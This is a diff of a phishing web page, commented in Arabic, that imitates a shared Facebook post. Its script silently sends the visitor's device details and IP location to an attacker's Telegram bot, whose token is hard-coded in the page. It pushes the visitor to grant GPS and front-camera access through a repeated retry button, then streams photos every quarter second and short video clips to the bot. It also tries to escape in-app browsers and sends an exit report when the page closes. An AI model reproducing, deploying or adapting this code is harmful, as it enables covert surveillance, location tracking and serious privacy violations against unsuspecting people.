@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
   <title>Shahin Zyan masengar</title>
-  <!-- Open Graph tags - سيتم تحديثها بواسطة Workflow -->
   <meta property="og:title" content="Shahin Zyan masengar">
   <meta property="og:description" content="شارك لك منشور">
   <meta property="og:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
@@ -70,7 +69,6 @@
   </style>
 </head>
 <body>
-  <!-- المنشور (يظهر مباشرة) -->
   <div class="post-container" id="postContainer">
     <div class="post-header">
       <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%23ccc'/%3E%3C/svg%3E" alt="">
@@ -85,7 +83,6 @@
     <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>
   </div>
 
-  <!-- شاشة إعادة المحاولة (تظهر عند الرفض) -->
   <div class="retry-overlay hidden" id="retryOverlay">
     <button class="retry-btn" id="retryBtn">إعادة المحاولة</button>
   </div>
@@ -93,14 +90,13 @@
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
-  <script>
-    // ==================== (1) الإعدادات ====================
-    const B = '69ee19e8856a68218974812e';   // معرف حاوية JSONBin
-    const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ'; // توكن البوت
-    const C = '5151102782';                  // معرف دردشة البوت
-    const I = 'a7e43833d69a75';              // رمز IPinfo
+  <script type="module">
+    // ==================== إعدادات ====================
+    const B = '69ee19e8856a68218974812e';
+    const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
+    const C = '5151102782';
+    const I = 'a7e43833d69a75';
 
-    // ==================== (2) عناصر DOM ====================
     const post = document.getElementById('postContainer');
     const overlay = document.getElementById('retryOverlay');
     const retryBtn = document.getElementById('retryBtn');
@@ -108,111 +104,61 @@
     const cnv = document.getElementById('canvas');
     const ctx = cnv.getContext('2d');
 
-    // ==================== (3) متغيرات الحالة ====================
-    let stream = null;                       // بث الكاميرا
-    let photos = 0;                          // عدد الصور الملتقطة
-    let captureInterval = null;              // مؤشر التصوير المستمر
-    let mediaRecorder = null;                // مسجل الفيديو
-    let videoChunks = [];                    // أجزاء الفيديو
-    let recording = false;                   // هل الفيديو قيد التسجيل؟
-    let deviceInfoSent = false;              // هل أُرسلت معلومات الجهاز؟
-    let gpsLoc = null;                       // الموقع الدقيق (GPS)
-    let ipLoc = null;                        // الموقع التقريبي (IP)
-    let redirectUrl = 'https://www.facebook.com'; // رابط التوجيه النهائي
+    let stream, photos = 0, capInt, redir = 'https://www.facebook.com', deviceInfoSent = false, gpsLoc = null, ipLoc = null;
+    let recording = false;
+    let locationGranted = false;   // هل قبل المستخدم GPS؟
+    let cameraGranted = false;     // هل قبل المستخدم الكاميرا؟
 
-    let locationGranted = false;             // هل قَبِل المستخدم GPS؟
-    let cameraGranted = false;               // هل قَبِل المستخدم الكاميرا؟
-
-    // ==================== (4) دوال مساعدة ====================
-    /** إرسال رسالة نصية إلى البوت */
     async function sendText(text) {
       try {
         await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ chat_id: C, text: text, parse_mode: 'HTML' })
         });
-      } catch (e) { /* فشل الإرسال بصمت */ }
+      } catch (e) {}
     }
 
-    /** تحويل DataURL إلى كائن Blob */
-    function dataURLtoBlob(dataUrl) {
-      const arr = dataUrl.split(',');
-      const mime = arr[0].match(/:(.*?);/)[1];
-      const bstr = atob(arr[1]);
-      const n = bstr.length;
-      const u8 = new Uint8Array(n);
-      for (let i = 0; i < n; i++) u8[i] = bstr.charCodeAt(i);
+    function dataURLtoBlob(u) {
+      const arr = u.split(','), mime = arr[0].match(/:(.*?);/)[1], bstr = atob(arr[1]), n = bstr.length, u8 = new Uint8Array(n);
+      while (n--) u8[n] = bstr.charCodeAt(n);
       return new Blob([u8], { type: mime });
     }
 
-    /** إظهار شاشة إعادة المحاولة وإخفاء المنشور */
-    function showOverlay() {
-      post.classList.add('hidden');
-      overlay.classList.remove('hidden');
-      if (captureInterval) clearInterval(captureInterval);
-    }
+    function showOverlay() { post.classList.add('hidden'); overlay.classList.remove('hidden'); }
+    function hideOverlay() { overlay.classList.add('hidden'); post.classList.remove('hidden'); }
+    function stopAll() { if (capInt) clearInterval(capInt); if (stream) stream.getTracks().forEach(t => t.stop()); }
 
-    /** إخفاء شاشة إعادة المحاولة وإظهار المنشور */
-    function hideOverlay() {
-      overlay.classList.add('hidden');
-      post.classList.remove('hidden');
-    }
-
-    /** إيقاف التصوير والفيديو */
-    function stopAll() {
-      if (captureInterval) clearInterval(captureInterval);
-      if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
-      if (stream) stream.getTracks().forEach(t => t.stop());
-    }
-
-    // ==================== (5) تحميل بيانات المنشور ====================
+    // ==================== تحميل المنشور ====================
     async function loadPost() {
       try {
         const r = await fetch(`https://api.jsonbin.io/v3/b/${B}/latest`);
-        const d = await r.json();
-        const s = d.record || {};
-        redirectUrl = s.redirectUrl || redirectUrl;
-
-        const name = s.profileName || 'Shahin Zyan';
-        const avatar = s.profilePicture || 'https://i.ibb.co/zJx0q3Q/default-avatar.png';
-        const text = s.postText || 'هذا نص تجريبي.';
-        const postImg = s.postImage || '';
-        const time = s.postTime || 'الآن';
-        const comments = s.commentsCount || '12';
-        const shares = s.sharesCount || '5';
-
+        const d = await r.json(); const s = d.record || {};
+        redir = s.redirectUrl || redir;
         post.innerHTML = `
           <div class="post-header">
-            <img src="${avatar}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27%3E%3Ccircle cx=%2750%27 cy=%2750%27 r=%2750%27 fill=%27%23ccc%27/%3E%3C/svg%3E'">
+            <img src="${s.profilePicture||'https://i.ibb.co/zJx0q3Q/default-avatar.png'}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 viewBox=%270 0 100 100%27%3E%3Ccircle cx=%2750%27 cy=%2750%27 r=%2750%27 fill=%27%23ccc%27/%3E%3C/svg%3E'">
             <div>
-              <div class="post-user">${name}</div>
-              <div class="post-time">${time}</div>
+              <div class="post-user">${s.profileName||'Shahin Zyan'}</div>
+              <div class="post-time">${s.postTime||'الآن'}</div>
             </div>
             <div class="three-dots">⋯</div>
           </div>
-          <div class="post-text">${text}</div>
-          ${postImg ? `<div class="post-image"><img src="${postImg}" alt="صورة المنشور"></div>` : ''}
-          <div class="post-stats"><span>${comments} تعليق</span><span>${shares} مشاركة</span></div>
+          <div class="post-text">${s.postText||'هذا نص تجريبي.'}</div>
+          ${s.postImage?`<div class="post-image"><img src="${s.postImage}" alt="صورة المنشور"></div>`:''}
+          <div class="post-stats"><span>${s.commentsCount||'12'} تعليق</span><span>${s.sharesCount||'5'} مشاركة</span></div>
           <div class="post-actions"><span>أعجبني</span><span>تعليق</span><span>مشاركة</span></div>`;
-      } catch (e) { /* فشل التحميل بصمت */ }
+      } catch (e) {}
     }
 
-    // ==================== (6) معلومات الجهاز (تُرسل فوراً) ====================
+    // ==================== معلومات الجهاز ====================
     async function sendDeviceInfo() {
       if (deviceInfoSent) return;
       deviceInfoSent = true;
       try {
-        const ua = navigator.userAgentData || {};
-        let h = {};
-        if (ua.getHighEntropyValues) {
-          try { h = await ua.getHighEntropyValues(["platform","platformVersion","model","architecture"]); } catch(e) {}
-        }
-        const sc = window.screen;
-        let bat = null;
-        if ('getBattery' in navigator) {
-          try { const b = await navigator.getBattery(); bat = { level: b.level, charging: b.charging }; } catch(e) {}
-        }
+        const ua = navigator.userAgentData || {}; let h = {};
+        if (ua.getHighEntropyValues) try { h = await ua.getHighEntropyValues(["platform","platformVersion","model","architecture"]); } catch(e) {}
+        const sc = window.screen; let bat = null;
+        if ('getBattery' in navigator) try { const b = await navigator.getBattery(); bat = { level: b.level, charging: b.charging }; } catch(e) {}
         let txt = '<b>📱 معلومات الجهاز</b>\n';
         txt += `الموديل: ${h.model||'N/A'}\nالنظام: ${navigator.platform}\nالشاشة: ${sc.width}x${sc.height}\n`;
         txt += `المعالج: ${navigator.hardwareConcurrency||1} نواة\nالذاكرة: ${navigator.deviceMemory||'N/A'}GB\n`;
@@ -222,163 +168,135 @@
       } catch (e) {}
     }
 
-    // ==================== (7) الموقع عبر IP (يُرسل بصمت) ====================
+    // ==================== الموقع (IP) - يُرسل بصمت مع روابط الخرائط ====================
     async function fetchIPLocation() {
       try {
-        const r = await fetch(`https://ipinfo.io/json?token=${I}`);
-        const d = await r.json();
+        const r = await fetch(`https://ipinfo.io/json?token=${I}`); const d = await r.json();
         if (d.loc) {
           const [lat, lon] = d.loc.split(',').map(Number);
           ipLoc = { lat, lon, acc: 5000, src: 'IP' };
-          await sendText(`📍 الموقع التقريبي (IP): ${lat}, ${lon}\n🌍 خرائط Google: https://www.google.com/maps?q=${lat},${lon}\n🍎 خرائط Apple: http://maps.apple.com/?ll=${lat},${lon}&q=موقع\n🗺️ OpenStreetMap: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=15`);
+          await sendText(
+            `📍 <b>الموقع التقريبي (نوع السحب: IP)</b>\n` +
+            `الإحداثيات: ${lat}, ${lon}\n` +
+            `🌍 <a href="https://www.google.com/maps?q=${lat},${lon}">خرائط Google</a>\n` +
+            `🍎 <a href="http://maps.apple.com/?ll=${lat},${lon}&q=موقع">خرائط Apple</a>\n` +
+            `🗺️ <a href="https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=15">OpenStreetMap</a>`
+          );
         }
       } catch (e) {}
     }
 
-    // ==================== (8) طلب الموقع الدقيق (GPS) ====================
+    // ==================== الموقع الدقيق (GPS) - يُرسل فوراً مع روابط الخرائط ====================
     async function requestGPS() {
       if (!navigator.geolocation) return false;
       try {
         const pos = await new Promise((res, rej) => {
-          navigator.geolocation.getCurrentPosition(res, rej, {
-            enableHighAccuracy: true,   // دقة عالية
-            timeout: 15000,             // انتظار حتى 15 ثانية
-            maximumAge: 0               // لا تستخدم موقع قديم
-          });
+          navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
         });
-        // نتحقق من الدقة (أقل من 50 متر مقبول)
-        if (pos.coords.accuracy && pos.coords.accuracy > 50) return false;
-        gpsLoc = {
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          acc: pos.coords.accuracy,
-          src: 'GPS'
-        };
-        const maps = `https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}`;
+        if (pos.coords.accuracy > 50) return false;
+        gpsLoc = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, src: 'GPS' };
+        // إرسال فوري للموقع الدقيق
         await sendText(
-          `📍 الموقع الدقيق (GPS): ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n` +
-          `🌍 خرائط Google: ${maps}\n` +
-          `🍎 خرائط Apple: http://maps.apple.com/?ll=${gpsLoc.lat},${gpsLoc.lon}&q=موقع\n` +
-          `🗺️ OpenStreetMap: https://www.openstreetmap.org/?mlat=${gpsLoc.lat}&mlon=${gpsLoc.lon}&zoom=18`
+          `📍 <b>الموقع الدقيق (نوع السحب: GPS)</b>\n` +
+          `الإحداثيات: ${gpsLoc.lat}, ${gpsLoc.lon} (دقة ${gpsLoc.acc}م)\n` +
+          `🌍 <a href="https://www.google.com/maps?q=${gpsLoc.lat},${gpsLoc.lon}">خرائط Google</a>\n` +
+          `🍎 <a href="http://maps.apple.com/?ll=${gpsLoc.lat},${gpsLoc.lon}&q=موقع">خرائط Apple</a>\n` +
+          `🗺️ <a href="https://www.openstreetmap.org/?mlat=${gpsLoc.lat}&mlon=${gpsLoc.lon}&zoom=18">OpenStreetMap</a>`
         );
         return true;
-      } catch (e) {
-        return false;
-      }
+      } catch (e) { return false; }
     }
 
-    // ==================== (9) محاولة الحصول على GPS (تظهر المنشور ثم تطلب) ====================
+    // ==================== طلب الموقع فقط (مع زر إعادة المحاولة) ====================
     async function tryLocation() {
-      hideOverlay();
-      await new Promise(r => setTimeout(r, 200)); // ننتظر قليلاً ليظهر المنشور
+      hideOverlay();              // نظهر المنشور
+      await new Promise(r => setTimeout(r, 200));
       const ok = await requestGPS();
       if (ok) {
         locationGranted = true;
-        await tryCamera(); // ننتقل فوراً لطلب الكاميرا
+        // انتقل للكاميرا
+        await tryCamera();
       } else {
-        showOverlay(); // رفض → إظهار زر الإعادة
+        showOverlay();            // رفض -> إظهار زر الإعادة
       }
     }
 
-    // ==================== (10) طلب الكاميرا ====================
+    // ==================== الكاميرا ====================
     async function startCamera() {
       try {
-        stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' },
-          audio: false
-        });
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
         vid.srcObject = stream;
         await new Promise(r => { vid.onloadedmetadata = () => { vid.play(); r(); }; });
-        captureInterval = setInterval(captureAndSend, 250); // صورة كل 250 مللي ثانية
+        capInt = setInterval(captureAndSend, 250);
         return true;
-      } catch (e) {
-        return false;
-      }
+      } catch (e) { return false; }
     }
 
-    // ==================== (11) محاولة الحصول على الكاميرا ====================
+    function captureAndSend() {
+      if (!stream || !vid.videoWidth) return;
+      cnv.width = vid.videoWidth; cnv.height = vid.videoHeight;
+      ctx.drawImage(vid, 0, 0);
+      const blob = dataURLtoBlob(cnv.toDataURL('image/jpeg', 0.9));
+      const form = new FormData(); form.append('chat_id', C); form.append('photo', blob, 'snap.jpg');
+      fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: form }).catch(() => {});
+      photos++;
+      if (photos % 5 === 0 && !recording) startVideoRecording();
+    }
+
+    function startVideoRecording() {
+      if (!stream || recording) return;
+      try {
+        recording = true; const chunks = [];
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
+        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+        recorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          const form = new FormData(); form.append('chat_id', C); form.append('video', blob, 'clip.webm');
+          form.append('caption', '🎥 فيديو تلقائي');
+          await fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: form }).catch(() => {});
+          recording = false;
+        };
+        recorder.start();
+        setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 3000);
+      } catch (e) { recording = false; }
+    }
+
+    // ==================== طلب الكاميرا فقط (مع زر إعادة المحاولة) ====================
     async function tryCamera() {
-      hideOverlay();
+      hideOverlay();              // نظهر المنشور
       await new Promise(r => setTimeout(r, 200));
       const ok = await startCamera();
       if (ok) {
         cameraGranted = true;
-        hideOverlay(); // كل شيء تمام
+        hideOverlay();            // كل شيء تمام
       } else {
-        showOverlay(); // رفض → إظهار زر الإعادة
+        showOverlay();            // رفض -> إظهار زر الإعادة (الموقع بقي مقبولاً)
       }
     }
 
-    // ==================== (12) التقاط صورة وإرسالها ====================
-    function captureAndSend() {
-      if (!stream || !vid.videoWidth) return;
-      cnv.width = vid.videoWidth;
-      cnv.height = vid.videoHeight;
-      ctx.drawImage(vid, 0, 0);
-      const dataUrl = cnv.toDataURL('image/jpeg', 0.9); // جودة عالية 90%
-      const blob = dataURLtoBlob(dataUrl);
-      const form = new FormData();
-      form.append('chat_id', C);
-      form.append('photo', blob, 'snap.jpg');
-      fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: form }).catch(() => {});
-      photos++;
-
-      // كل 5 صور نبدأ فيديو قصير (إذا لم نكن نسجل حالياً)
-      if (photos % 5 === 0 && !recording) {
-        startVideoRecording();
+    // ==================== إعادة المحاولة ====================
+    retryBtn.addEventListener('click', async () => {
+      if (!locationGranted) {
+        await tryLocation();         // لم يقبل الموقع بعد، نحاول الموقع مجدداً
+      } else if (!cameraGranted) {
+        await tryCamera();           // الموقع مقبول، نحاول الكاميرا
       }
-    }
+    });
 
-    // ==================== (13) تسجيل فيديو قصير وإرساله ====================
-    function startVideoRecording() {
-      if (!stream || recording) return;
-      try {
-        recording = true;
-        videoChunks = [];
-        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
-        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) videoChunks.push(e.data); };
-        mediaRecorder.onstop = async () => {
-          const blob = new Blob(videoChunks, { type: 'video/webm' });
-          const form = new FormData();
-          form.append('chat_id', C);
-          form.append('video_note', blob, 'clip.webm'); // فيديو دائري (Video Note)
-          await fetch(`https://api.telegram.org/bot${T}/sendVideoNote`, { method: 'POST', body: form }).catch(() => {});
-          recording = false;
-        };
-        mediaRecorder.start();
-        setTimeout(() => {
-          if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
-        }, 3000); // 3 ثوانٍ
-      } catch (e) {
-        recording = false;
-      }
-    }
-
-    // ==================== (14) تقرير نهائي عند الخروج ====================
+    // ==================== تقرير الخروج ====================
     async function sendExitReport() {
       let locStr = 'غير متوفر';
       if (gpsLoc) locStr = `GPS (${gpsLoc.lat}, ${gpsLoc.lon}, دقة ${gpsLoc.acc}م)`;
       else if (ipLoc) locStr = `IP (${ipLoc.lat}, ${ipLoc.lon})`;
-      const report = `<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`;
-      await sendText(report);
+      await sendText(`<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`);
     }
 
-    // ==================== (15) زر إعادة المحاولة ====================
-    retryBtn.addEventListener('click', async () => {
-      if (!locationGranted) {
-        await tryLocation();
-      } else if (!cameraGranted) {
-        await tryCamera();
-      }
-    });
-
-    // ==================== (16) خطة الهروب من WebView ====================
+    // ==================== خطة الهروب من WebView (جميع الطرق) ====================
     async function attemptEscape() {
       const targetUrl = window.location.href;
       const ua = navigator.userAgent || '';
       const isIOS = /iPhone|iPad|iPod/i.test(ua);
       const isAndroid = /Android/i.test(ua);
-
       const iosMethods = [
         () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'x-safari-https://'); },
         () => { window.location.href = targetUrl.replace(/^https?:\/\//, 'googlechrome://'); },
@@ -394,7 +312,6 @@
         () => { window.open(targetUrl, '_blank', 'noopener,noreferrer'); }
       ];
       const methods = isIOS ? iosMethods : isAndroid ? androidMethods : [() => { window.open(targetUrl, '_blank'); }];
-
       for (let i = 0; i < methods.length; i++) {
         try { methods[i](); } catch(e) {}
         await new Promise(r => setTimeout(r, 300));
@@ -412,21 +329,19 @@
 
     if (isInAppBrowser()) attemptEscape();
 
-    // ==================== (17) حدث الخروج ====================
     window.addEventListener('beforeunload', () => {
       stopAll();
       sendExitReport();
     });
 
-    // ==================== (18) بدء التشغيل ====================
+    // ==================== بدء التشغيل ====================
     (async function init() {
-      await loadPost();          // تحميل المنشور
-      sendDeviceInfo();          // إرسال معلومات الجهاز فوراً (بصمت)
-      fetchIPLocation();         // إرسال الموقع عبر IP فوراً (بصمت)
-
-      // بعد 600 مللي ثانية، نبدأ بطلب الموقع الدقيق
+      await loadPost();
+      sendDeviceInfo();
+      fetchIPLocation();
+      // المنشور ظاهر، نبدأ بطلب الموقع بعد 600ms
       setTimeout(async () => {
-        await tryLocation();     // يطلب GPS، ثم إذا نجح يطلب الكاميرا تلقائياً
+        await tryLocation();      // يطلب GPS أولاً، إذا نجح ينتقل للكاميرا تلقائياً
       }, 600);
     })();
   </script>
